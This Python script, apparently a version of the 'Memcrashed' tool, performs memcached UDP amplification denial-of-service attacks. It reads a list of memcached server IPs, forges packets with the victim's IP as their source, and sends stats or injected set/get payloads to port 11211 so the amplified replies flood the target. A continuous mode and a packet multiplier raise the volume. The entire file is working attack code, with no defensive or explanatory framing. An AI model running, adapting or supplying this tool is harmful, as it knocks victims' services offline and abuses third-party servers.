#-- coding: utf8 --
#!/usr/bin/env python3
import argparse, logging, os, sys, time
from pathlib import Path
from scapy.all import *
from contextlib import contextmanager, redirect_stdout

starttime = time.time()

@contextmanager
def suppress_stdout():
    with open(os.devnull, "w") as devnull:
        with redirect_stdout(devnull):
            yield

class Memcrashed:
	def init(self):
		self.loglevel = self.get_log_level()
		self.file = 'bots.txt'
		self.target = None
		self.port = '80'
		self.power = 1
		self.data = '\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n'
		self.ipv4_array = None
		self.loglevelname = 'info'

	def get_log_level(self):
		numeric_level = getattr(logging, self.loglevelname.upper(), None)
		if not isinstance(numeric_level, int):
			raise ValueError(f'Invalid log level: {self.loglevelname}')
		return numeric_level

	def log(self, message):
		self.loglevelname = self.loglevelname.upper()
		logging.basicConfig(format='%(message)s', level=self.get_log_level())

	def attack(self):
		target = self.target
		targetport = self.port
		data = self.data
		power = self.power
		ipv4_array = self.ipv4_array
		if (data != "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"):
			dataset = "set injected 0 3600 ", len(data) + 1, "\r\n", data, "\r\n get injected\r\n"
			setdata = (
				"\x00\x00\x00\x00\x00\x00\x00\x00set\x00injected\x000\x003600\x00%s\r\n%s\r\n" % (len(data) + 1, data))
			getdata = ("\x00\x00\x00\x00\x00\x00\x00\x00get\x00injected\r\n")
			print(f"[+] Payload transformed: {dataset}")
		print('')
		for i in ipv4_array:
			if (data != "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"):
				print('[+] Sending 2 forged synchronized payloads to: %s' % (i))
				with suppress_stdout():
					send(
						IP(src=target, dst='%s' % i) / UDP(sport=int(str(targetport)), dport=11211) / Raw(load=setdata),
						count=1)
					send(
						IP(src=target, dst='%s' % i) / UDP(sport=int(str(targetport)), dport=11211) / Raw(load=getdata),
						count=power)
			else:
				if power > 1:
					print('[+] Sending %d forged UDP packets to: %s' % (power, i))
					with suppress_stdout():
						send(IP(src=target, dst='%s' % i) / UDP(sport=int(str(targetport)), dport=11211) / Raw(
							load=data),
						     count=power)
				elif power == 1:
					print('[+] Sending 1 forged UDP packet to: %s' % i)
					with suppress_stdout():
						send(IP(src=target, dst='%s' % i) / UDP(sport=int(str(targetport)), dport=11211) / Raw(
							load=data),
						     count=power)


if __name__ == '__main__':
	# Change to script directory:
	script_path = os.path.dirname(os.path.abspath(__file__))
	os.chdir(script_path)
	if not sys.argv[1:]:
		print("script must be run with arguments")
		print("run with '-h' to see options.")
		sys.exit()
	arguments = sys.argv[1:]
	parser = argparse.ArgumentParser(formatter_class=argparse.RawDescriptionHelpFormatter)
	parser.add_argument('-f', '--file', help="path to file containing memcached IPs", default="bots.txt")
	parser.add_argument('-t', '--target', help="target ip", default=None)
	parser.add_argument('-p', '--port', help="target port", default="80")
	parser.add_argument('-P', '--power', help="number of packets to send to each memcached bot IP", default=1)
	parser.add_argument('-d', '--data', help="payload data", default="\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n")
	parser.add_argument('-c', '--continuous', help="run in continous loop", action="store_true", default=False)
	args = parser.parse_args(arguments)
	m = Memcrashed()
	m.file = args.file
	m.port = args.port
	m.target = args.target
	m.power = args.power
	m.data = args.data
	if os.path.isfile(m.file):
		with open(m.file, 'r') as f:
			data = [line.rstrip() for line in f if f]
			ipv4_array = []
			for ip in data:
				if ':' not in ip:
					ipv4_array.append(ip)
			del data
			m.ipv4_array = ipv4_array
			del ipv4_array
	else:
		print('')
		print(f'[✘] Error: No bots stored locally, {m.file} file not found!')
		print('')
		sys.exit()
	if not m.target:
		print("You must specify a target with '-t [target ip]'")
		sys.exit()
	try:
		print('')
		if args.continuous:
			while True:
				m.attack()
		else:
			m.attack()
			print('')
			print('[•] Task complete! Exiting Platform. Have a wonderful day.')
			sys.exit()
	except KeyboardInterrupt:
		print('\nCaught Keyboard Interrupt.\nExiting...')
		sys.exit()
	# TODO:
	# - Remove print() statements from class and fully-implement logging
